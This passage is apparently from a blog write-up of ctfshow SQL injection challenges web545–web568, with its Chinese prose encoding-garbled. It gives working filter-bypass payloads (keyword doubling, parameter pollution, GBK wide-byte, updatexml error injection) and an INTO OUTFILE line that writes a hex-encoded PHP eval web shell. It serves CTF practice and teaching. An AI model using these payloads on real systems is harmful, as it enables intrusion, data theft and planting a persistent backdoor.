        break
    print(result)
</code></pre>
<h2 id="web545">web545</h2>
<p>è¿‡æ»¤äº†select,union,ç©ºæ ¼</p>
<pre><code class="language-php">&lt;?php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);		//strip out /*
$id= preg_replace('/[--]/',&quot;&quot;, $id);		//Strip out --.
$id= preg_replace('/[#]/',&quot;&quot;, $id);			//Strip out #.
$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
$id= preg_replace('/select/m',&quot;&quot;, $id);	    //Strip out spaces.
$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
$id= preg_replace('/union/s',&quot;&quot;, $id);	    //Strip out union
$id= preg_replace('/select/s',&quot;&quot;, $id);	    //Strip out select
$id= preg_replace('/UNION/s',&quot;&quot;, $id);	    //Strip out UNION
$id= preg_replace('/SELECT/s',&quot;&quot;, $id);	    //Strip out SELECT
$id= preg_replace('/Union/s',&quot;&quot;, $id);	    //Strip out Union
$id= preg_replace('/Select/s',&quot;&quot;, $id);	    //Strip out select
return $id;
}
</code></pre>
<p>è¿‡æ»¤äº†è®¸å¤šï¼Œä½†è¿˜æ˜¯å¯ä»¥ç”¨é‡å†™çš„æ–¹å¼æ¥ç»•è¿‡<br>
å› ä¸ºselectè¿‡æ»¤äº†ä¸¤æ¬¡ï¼Œéœ€è¦å¤šå¥—ä¸€å±‚ã€‚</p>
<p>æŠ¥é”™æ³¨å…¥</p>
<pre><code>%27and%0aupdatexml(1,concat(0x3d,(seselselectectlect%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata)),1)and%27
</code></pre>
<p>ç›´æ¥ä½¿ç”¨unionæ³¨å…¥ä¹Ÿè¡Œ</p>
<pre><code>999%27%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),%273
</code></pre>
<h2 id="web546">web546</h2>
<p>åŒä¸Šé¢˜ï¼Œ<code>&quot;</code>é—­åˆ</p>
<pre><code>999&quot;%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),&quot;3
</code></pre>
<h2 id="web547">web547</h2>
<p><code>')</code>é—­åˆï¼Œæ›´æ”¹äº†è¿‡æ»¤è§„åˆ™ã€‚</p>
<pre><code class="language-php">&lt;?php
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);				//strip out /*
$id= preg_replace('/[--]/',&quot;&quot;, $id);				//Strip out --.
$id= preg_replace('/[#]/',&quot;&quot;, $id);					//Strip out #.
$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
//$id= preg_replace('/select/m',&quot;&quot;, $id);	   		 	//Strip out spaces.
$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
$id= preg_replace('/union\s+select/i',&quot;&quot;, $id);	    //Strip out UNION &amp; SELECT.
return $id;
}
</code></pre>
<p>è¿‡æ»¤äº†union\s+selectï¼ŒåŒæ ·ä½¿ç”¨é‡å†™çš„æ–¹å¼ã€‚</p>
<pre><code>999%27)%0aunion%0aunion%0aselectselect%0a1,(select%0aflag4s%0afrom%0actfshow.flags),(%273
</code></pre>
<h2 id="web548">web548</h2>
<p>åŒä¸Š</p>
<h2 id="web549">web549</h2>
<p>æç¤ºæœ‰waf<br>
åˆ†æä¸‹ä»£ç </p>
<pre><code class="language-php">&lt;?php
//including the Mysql connect parameters.
include(&quot;../sql-connections/sql-connect.php&quot;);
//disable error reporting
error_reporting(0);

// take the variables 
if(isset($_GET['id']))
{
	$qs = $_SERVER['QUERY_STRING'];
	$hint=$qs;
	$id1=java_implimentation($qs);
	$id=$_GET['id'];
	//echo $id1;
	whitelist($id1);
	
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'ID:'.$id.&quot;\n&quot;);
	fclose($fp);
// connectivity 
	$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
	$result=mysql_query($sql);
	$row = mysql_fetch_array($result);
	if($row)
	{
	  	echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;;	
	  	echo 'Your Login name:'. $row['username'];
	  	echo &quot;&lt;br&gt;&quot;;
	  	echo 'Your Password:' .$row['password'];
	  	echo &quot;&lt;/font&gt;&quot;;
  	}
	else 
	{
		echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
		print_r(mysql_error());
		echo &quot;&lt;/font&gt;&quot;;  
	}
}
	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
function whitelist($input)
{
	$match = preg_match(&quot;/^\d+$/&quot;, $input);
	if($match)
	{
		//echo &quot;you are good&quot;;
		//return $match;
	}
	else
	{	
		header('Location: hacked.php');
		//echo &quot;you are bad&quot;;
	}
}

// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
function java_implimentation($query_string)
{
	$q_s = $query_string;
	$qs_array= explode(&quot;&amp;&quot;,$q_s);


	foreach($qs_array as $key =&gt; $value)
	{
		$val=substr($value,0,2);
		if($val==&quot;id&quot;)
		{
			$id_value=substr($value,3,30); 
			return $id_value;
			echo &quot;&lt;br&gt;&quot;;
			break;
		}

	}

}
</code></pre>
<p>å‘ç°ä¼šå¯¹id1è¿›è¡Œæ£€æŸ¥ï¼Œå¿…é¡»ä¸ºæ•°å­—ï¼Œè¿™é‡Œæ²¡æ³•ç»•è¿‡ï¼Œä½†æ˜¯ä¼ å…¥sqlè¯­å¥çš„æ˜¯idï¼Œè¿™é‡Œid1æ˜¯è·å–ç¬¬ä¸€ä¸ªä¸ºidçš„å‚æ•°ï¼Œä½†æ˜¯<code>$_GET['id']</code>ï¼Œä¼šè·å–æœ€åä¸€ä¸ªidå‚æ•°çš„å€¼ã€‚</p>
<pre><code>?id=1&amp;id=-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web550">web550</h2>
<p>åŒä¸Šï¼Œ<code>&quot;</code>é—­åˆ</p>
<pre><code>?id=1&amp;id=-1&quot;%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web551">web551</h2>
<p>åŒä¸Šï¼Œ<code>&quot;)</code>é—­åˆ</p>
<pre><code>?id=1&amp;id=-1&quot;)%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web552">web552</h2>
<p>ç»•è¿‡è½¬ä¹‰å‡½æ•°addslashes<br>
å®½å­—èŠ‚æ³¨å…¥ã€‚</p>
<p>mysqlæœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯åœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰</p>
<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web553">web553</h2>
<p>åŒä¸Š</p>
<h2 id="web554">web554</h2>
<p>ä¹Ÿæ˜¯å®½å­—èŠ‚æ³¨å…¥</p>
<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=&amp;submit=Submit
</code></pre>
<h2 id="web555">web555</h2>
<p>è¿™é‡Œæ²¡æœ‰å¼•å·ï¼Œä¸éœ€è¦ç»•è¿‡addslashesï¼Œç›´æ¥æ³¨å…¥å°±è¡Œã€‚</p>
<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web556">web556</h2>
<p>è¿™é‡Œæ”¹ç”¨äº†mysql_real_escape_stringå‡½æ•°</p>
<p>ä½†æ˜¯éœ€è¦åœ¨æ‰§è¡Œsqlè¯­å¥ä¹‹å‰è°ƒç”¨ä¸€ä¸‹mysql_set_charsetå‡½æ•°ï¼Œè®¾ç½®å½“å‰è¿æ¥çš„å­—ç¬¦é›†ä¸ºgbkã€‚æ‰å¯ä»¥å®Œç¾çš„é˜²å¾¡</p>
<p>åŒæ ·ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥</p>
<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web557">web557</h2>
<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=123&amp;submit=Submit
</code></pre>
<h2 id="web558">web558</h2>
<p>ç”¨äº†mysqli_multi_queryå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨å †å æ³¨å…¥ï¼Œä½†æ˜¯unionæ³¨å…¥ä¹Ÿå¯ä»¥ã€‚</p>
<pre><code>-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web559">web559</h2>
<p>åŒä¸Š</p>
<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web560">web560</h2>
<p>åŒä¸Š</p>
<pre><code>-1%27)union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web561">web561</h2>
<p>åŒä¸Š</p>
<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
</code></pre>
<h2 id="web562">web562</h2>
<p>usernameå¤„åšäº†è¿‡æ»¤ï¼Œåœ¨passwdå¤„æ³¨å…¥ã€‚</p>
<pre><code>login_user=123&amp;login_password=-1%20%27union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
</code></pre>
<h2 id="web563">web563</h2>
<p>åŒä¸Šï¼Œ<code>')</code>é—­åˆ</p>
<pre><code>login_user=132&amp;login_password=-1%20%27)union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
</code></pre>
<h2 id="web564">web564</h2>
<p>order byç±»å‹æ³¨å…¥</p>
<p>æŠ¥é”™æ³¨å…¥</p>
<pre><code>?sort=updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)
</code></pre>
<pre><code>?sort=updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)
</code></pre>
<h2 id="web565">web565</h2>
<p>åŒä¸Šï¼Œ<code>'</code>é—­åˆ</p>
<pre><code>?sort=%27%20and%20updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)--+
</code></pre>
<pre><code>?sort=%27%20and%20updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)--+
</code></pre>
<h2 id="web566">web566</h2>
<p>åŒä¸Šï¼Œä½†æ²¡æœ‰æŠ¥é”™è¾“å‡ºäº†<br>
ä½¿ç”¨ç›²æ³¨çš„æ–¹å¼</p>
<p>è¿™é‡Œè¿˜èƒ½ç”¨into outfileå†™shellçš„æ–¹å¼ã€‚</p>
<pre><code>?sort=1 into outfile &quot;/var/www/html/1.php&quot;lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+
</code></pre>
<p>å†™phpè„šæœ¬æ¥æŸ¥è¯¢</p>
<pre><code class="language-php">&lt;?php
$q=@mysql_query(&quot;select flag4s from ctfshow.flags&quot;);while($rs=@mysql_fetch_row($q)){echo(&quot; (&quot;.$rs[0].&quot;)&quot;);}
</code></pre>
<h2 id="web567">web567</h2>
<p>åŒä¸Š</p>
<h2 id="web568">web568</h2>
<p>åŒä¸Šï¼Œ<code>'</code>é—­åˆ</p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p>https://blog.csdn.net/solitudi/article/details/115534124</p>
]]></content>
    </entry>
</feed>